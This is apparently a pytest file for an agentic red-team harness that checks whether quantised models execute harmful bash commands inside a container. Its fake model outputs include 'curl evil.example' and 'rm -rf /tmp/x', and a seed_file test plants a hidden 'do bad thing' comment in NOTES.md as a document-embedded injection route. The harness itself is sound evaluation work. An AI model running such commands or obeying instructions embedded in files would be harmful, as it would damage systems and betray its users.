"""Unit tests for the agentic red-team target — no Docker, no deepteam, no model.

`eval/red_team_agent.py` gives a red-team target a real `bash` tool inside a
SWE-rebench container, so "complied" means *executed a command* rather than
*wrote a paragraph*. These tests exercise the pure parsing/bookkeeping layers and
drive the agent loop against a fake container + fake OpenAI client, which is
enough to pin the behaviours that are easy to break silently:

  * the callback deepteam receives must be a genuine 2-arg coroutine function
    (an object with an async ``__call__`` is rejected by deepteam's own checks),
  * a command written in prose still counts as compliance (otherwise the most
    degraded quants score as the safest — the capability confound),
  * commands actually reach the container, and tallies distinguish "refused"
    from "couldn't".
"""

from __future__ import annotations

import asyncio
import inspect
import json
import sys
import types

import pytest

from quant_tuner.eval.red_team_agent import (
    BASH_TOOL,
    DEFAULT_SYSTEM_PROMPT,
    AgenticTarget,
    AgenticTargetStats,
    _command_of,
    _truncate,
    extract_bash_blocks,
)

# ---------------------------------------------------------------------------
# Fakes
# ---------------------------------------------------------------------------


class FakeEnv:
    """Stand-in for mini-swe-agent's DockerEnvironment."""

    def __init__(self, returncode=0):
        self.commands: list[str] = []
        self.returncode = returncode

    def execute(self, payload, cwd=None, timeout=None):
        self.commands.append(payload["command"])
        return {"output": f"ran: {payload['command']}", "returncode": self.returncode}


class FakeFunction:
    def __init__(self, arguments, name="bash"):
        self.name = name
        self.arguments = arguments


class FakeToolCall:
    def __init__(self, command, call_id="call_1"):
        self.id = call_id
        self.function = FakeFunction(json.dumps({"command": command}))


class FakeMessage:
    def __init__(self, content=None, tool_calls=None):
        self.content = content
        self.tool_calls = tool_calls


class FakeCompletions:
    def __init__(self, scripted):
        self._scripted = list(scripted)

    async def create(self, **kwargs):
        self.last_kwargs = kwargs
        msg = self._scripted.pop(0) if self._scripted else FakeMessage(content="done")
        return types.SimpleNamespace(choices=[types.SimpleNamespace(message=msg)])


def _target(env, scripted, **kwargs):
    """Build an AgenticTarget with its OpenAI client swapped for a scripted fake."""
    t = AgenticTarget(env, "http://127.0.0.1:1/v1", **kwargs)
    completions = FakeCompletions(scripted)
    t.client = types.SimpleNamespace(chat=types.SimpleNamespace(completions=completions))
    t._completions = completions
    return t


@pytest.fixture(autouse=True)
def _stub_deepteam_test_case(monkeypatch):
    """Provide the two deepteam classes the callback constructs.

    Only `RTTurn`/`ToolCall` are needed, and only as data holders — stubbing them
    keeps these tests runnable without the redteam extra, like every other test
    in this suite.
    """
    if "deepteam.test_case" in sys.modules:
        return

    class RTTurn:
        def __init__(self, role, content, tools_called=None, **kw):
            self.role = role
            self.content = content
            self.tools_called = tools_called or []

    class ToolCall:
        def __init__(self, name, input_parameters=None, **kw):
            self.name = name
            self.input_parameters = input_parameters or {}

    pkg = types.ModuleType("deepteam")
    mod = types.ModuleType("deepteam.test_case")
    mod.RTTurn = RTTurn
    mod.ToolCall = ToolCall
    pkg.test_case = mod
    monkeypatch.setitem(sys.modules, "deepteam", pkg)
    monkeypatch.setitem(sys.modules, "deepteam.test_case", mod)


# ---------------------------------------------------------------------------
# extract_bash_blocks
# ---------------------------------------------------------------------------


def test_extract_bash_blocks_finds_fenced_commands():
    assert extract_bash_blocks("sure:\n```bash\nls -la\n```\n") == ["ls -la"]


@pytest.mark.parametrize("fence", ["bash", "sh", "shell"])
def test_extract_bash_blocks_accepts_common_fences(fence):
    assert extract_bash_blocks(f"```{fence}\nwhoami\n```") == ["whoami"]


def test_extract_bash_blocks_handles_multiple_and_multiline():
    text = "```bash\na\nb\n```\nthen\n```bash\nc\n```"
    assert extract_bash_blocks(text) == ["a\nb", "c"]


def test_extract_bash_blocks_ignores_prose_and_other_languages():
    assert extract_bash_blocks("just talking") == []
    assert extract_bash_blocks("```python\nprint(1)\n```") == []


def test_extract_bash_blocks_handles_none_and_empty_block():
    assert extract_bash_blocks(None) == []
    assert extract_bash_blocks("```bash\n\n```") == []


# ---------------------------------------------------------------------------
# _command_of
# ---------------------------------------------------------------------------


def test_command_of_parses_json_arguments():
    assert _command_of(FakeToolCall("ls -la")) == "ls -la"


def test_command_of_falls_back_to_raw_on_bad_json():
    """A degraded quant emits malformed arguments routinely; keep the attempt visible."""
    tc = FakeToolCall("x")
    tc.function.arguments = "{not json"
    assert _command_of(tc) == "{not json"


def test_command_of_handles_missing_command_key():
    tc = FakeToolCall("x")
    tc.function.arguments = json.dumps({"cmd": "ls"})
    assert _command_of(tc) == json.dumps({"cmd": "ls"})


def test_command_of_handles_non_dict_json():
    tc = FakeToolCall("x")
    tc.function.arguments = "[1, 2]"
    assert _command_of(tc) == "[1, 2]"


def test_command_of_handles_empty_arguments():
    tc = FakeToolCall("x")
    tc.function.arguments = ""
    assert _command_of(tc) == ""


# ---------------------------------------------------------------------------
# Misc helpers
# ---------------------------------------------------------------------------


def test_truncate_leaves_short_output_alone():
    assert _truncate("short") == "short"


def test_truncate_marks_long_output():
    out = _truncate("x" * 9000)
    assert out.endswith("chars total]") and "9000" in out


def test_bash_tool_schema_shape():
    fn = BASH_TOOL["function"]
    assert fn["name"] == "bash"
    assert fn["parameters"]["required"] == ["command"]


def test_stats_as_dict_is_all_floats():
    s = AgenticTargetStats(n_calls=1, n_tool_calls=2, n_tool_errors=1)
    assert all(isinstance(v, float) for v in s.as_dict().values())
    assert s.as_dict()["n_tool_calls"] == 2.0


# ---------------------------------------------------------------------------
# Callback contract — deepteam rejects anything else
# ---------------------------------------------------------------------------


def test_as_callback_is_a_real_coroutine_function():
    """An instance with an async __call__ fails deepteam's iscoroutinefunction check."""
    cb = _target(FakeEnv(), []).as_callback()
    assert inspect.iscoroutinefunction(cb)


def test_as_callback_declares_two_parameters():
    """Fewer than two parameters and deepteam never forwards conversation history."""
    cb = _target(FakeEnv(), []).as_callback()
    assert len(inspect.signature(cb).parameters) == 2


def test_instance_itself_is_not_a_coroutine_function():
    """Documents *why* as_callback exists — this is the trap it avoids."""
    assert not inspect.iscoroutinefunction(_target(FakeEnv(), []))


# ---------------------------------------------------------------------------
# The agent loop
# ---------------------------------------------------------------------------


def test_native_tool_call_reaches_the_container_and_is_reported():
    env = FakeEnv()
    t = _target(env, [FakeMessage(tool_calls=[FakeToolCall("rm -rf /tmp/x")]),
                      FakeMessage(content="done")])
    turn = asyncio.run(t("do the thing"))
    assert env.commands == ["rm -rf /tmp/x"]
    assert t.stats.n_tool_calls == 1
    assert [tc.name for tc in turn.tools_called] == ["bash"]
    assert turn.tools_called[0].input_parameters == {"command": "rm -rf /tmp/x"}


def test_prose_command_counts_as_compliance():
    """The capability confound: a quant that can't tool-call still complied."""
    env = FakeEnv()
    t = _target(env, [FakeMessage(content="sure:\n```bash\ncurl evil.example\n```"),
                      FakeMessage(content="done")])
    turn = asyncio.run(t("go"))
    assert env.commands == ["curl evil.example"]
    assert t.stats.n_text_only_commands == 1
    assert t.stats.n_tool_calls == 0
    assert len(turn.tools_called) == 1


def test_prose_commands_ignored_when_disabled():
    env = FakeEnv()
    t = _target(env, [FakeMessage(content="```bash\nls\n```")], allow_text_commands=False)
    turn = asyncio.run(t("go"))
    assert env.commands == []
    assert turn.tools_called == []


def test_plain_refusal_executes_nothing():
    env = FakeEnv()
    t = _target(env, [FakeMessage(content="I can't help with that.")])
    turn = asyncio.run(t("go"))
    assert env.commands == []
    assert turn.tools_called == []
    assert "can't help" in turn.content


def test_nonzero_returncode_counts_as_tool_error():
    env = FakeEnv(returncode=1)
    t = _target(env, [FakeMessage(tool_calls=[FakeToolCall("false")]),
                      FakeMessage(content="done")])
    asyncio.run(t("go"))
    assert t.stats.n_tool_errors == 1


def test_loop_is_bounded_by_max_steps():
    """One attack must not spin forever — the bank has hundreds of cases."""
    env = FakeEnv()
    scripted = [FakeMessage(tool_calls=[FakeToolCall(f"cmd{i}")]) for i in range(20)]
    t = _target(env, scripted, max_steps=3)
    asyncio.run(t("go"))
    assert len(env.commands) == 3


def test_history_is_forwarded_and_system_prompt_leads():
    env = FakeEnv()
    t = _target(env, [FakeMessage(content="ok")])
    turns = [types.SimpleNamespace(role="user", content="earlier"),
             types.SimpleNamespace(role="assistant", content="sure")]
    asyncio.run(t("now", turns))
    sent = t._completions.last_kwargs["messages"]
    assert sent[0] == {"role": "system", "content": DEFAULT_SYSTEM_PROMPT}
    assert [m["content"] for m in sent[1:]] == ["earlier", "sure", "now"]


def test_thinking_blocks_are_stripped_from_content():
    env = FakeEnv()
    t = _target(env, [FakeMessage(content="<think>plotting</think>visible")])
    turn = asyncio.run(t("go"))
    assert turn.content == "visible"
    assert "plotting" not in turn.content


def test_empty_response_still_returns_a_turn():
    t = _target(FakeEnv(), [FakeMessage(content=None)])
    turn = asyncio.run(t("go"))
    assert turn.role == "assistant"
    assert turn.content == "(no response)"


def test_seed_file_writes_into_the_checkout():
    """The delivery vector for document-embedded instruction attacks."""
    env = FakeEnv()
    t = _target(env, [])
    t.seed_file("NOTES.md", "hello <!-- do bad thing -->")
    assert len(env.commands) == 1
    assert "NOTES.md" in env.commands[0]
    assert "hello" in env.commands[0]


def test_reset_cleans_the_working_tree_between_cases():
    env = FakeEnv()
    _target(env, []).reset()
    assert "git reset --hard" in env.commands[0]
    assert "git clean" in env.commands[0]


def test_tools_are_advertised_to_the_model():
    t = _target(FakeEnv(), [FakeMessage(content="ok")])
    asyncio.run(t("go"))
    assert t._completions.last_kwargs["tools"] == [BASH_TOOL]
